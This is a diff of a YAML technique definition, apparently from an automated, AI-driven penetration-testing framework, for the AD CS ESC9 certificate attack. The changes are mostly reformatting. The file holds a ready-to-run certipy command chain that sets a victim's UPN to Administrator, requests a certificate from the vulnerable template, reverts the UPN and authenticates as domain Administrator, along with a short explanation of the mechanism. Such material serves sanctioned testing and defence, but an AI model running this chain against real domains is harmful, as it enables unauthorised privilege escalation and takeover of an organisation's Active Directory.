@@ -1,6 +1,6 @@
 name: adcs_esc9
 category: ad
-description: ADCS ESC9 — no security extension, UPN spoofing after cert issuance
+description: "ADCS ESC9 \u2014 no security extension, UPN spoofing after cert issuance"
 preconditions:
 - has_cred
 - service.port==445
@@ -12,11 +12,10 @@ parameters:
   password: from_cred.password
   ca: from_engagement.ca
   victim: from_engagement.victim_user
-command_template: certipy account update -u {username}@{domain} -p '{password}' -user
-  '{victim}' -upn Administrator@{domain} && certipy req -u '{victim}@{domain}' -p
-  '{password}' -ca '{ca}' -template ESC9 -dc-ip {target_ip} && certipy account update
-  -u {username}@{domain} -p '{password}' -user '{victim}' -upn '{victim}@{domain}'
-  && certipy auth -pfx administrator.pfx -domain {domain}
+command_template: certipy account update -u {username}@{domain} -p '{password}' -user '{victim}' -upn Administrator@{domain}
+  && certipy req -u '{victim}@{domain}' -p '{password}' -ca '{ca}' -template ESC9 -dc-ip {target_ip} && certipy account update
+  -u {username}@{domain} -p '{password}' -user '{victim}' -upn '{victim}@{domain}' && certipy auth -pfx administrator.pfx
+  -domain {domain}
 parser: generic_parser
 expected_effects:
 - certificate_obtained
@@ -27,15 +26,14 @@ falsifier:
   pattern: SECURITY_EXTENSION|UPN_MISMATCH|ACCESS_DENIED|template not found
   timeout: 120
 model_tier: sonnet
-mechanism: 'Template with msPKI-Enrollment-Flag CT_FLAG_NO_SECURITY_EXTENSION means
-  the issued
-
-  cert won''t bind the SID. Flip victim''s UPN to Administrator@domain, request cert,
-
-  flip UPN back. PKINIT authenticates based on UPN → cert auth as Administrator.
-
-  '
+mechanism: "Template with msPKI-Enrollment-Flag CT_FLAG_NO_SECURITY_EXTENSION means the issued\ncert won't bind the SID. Flip\
+  \ victim's UPN to Administrator@domain, request cert,\nflip UPN back. PKINIT authenticates based on UPN \u2192 cert auth\
+  \ as Administrator.\n"
 references:
   ocd_mindmap: 'Branch 7: ADCS ESC9 (no security extension)'
   hacktricks: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+  ocd_mindmap_node_ids:
+  - 42fea85308
+  - 548ee31bbc
+  - d8bc6299ef
 hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
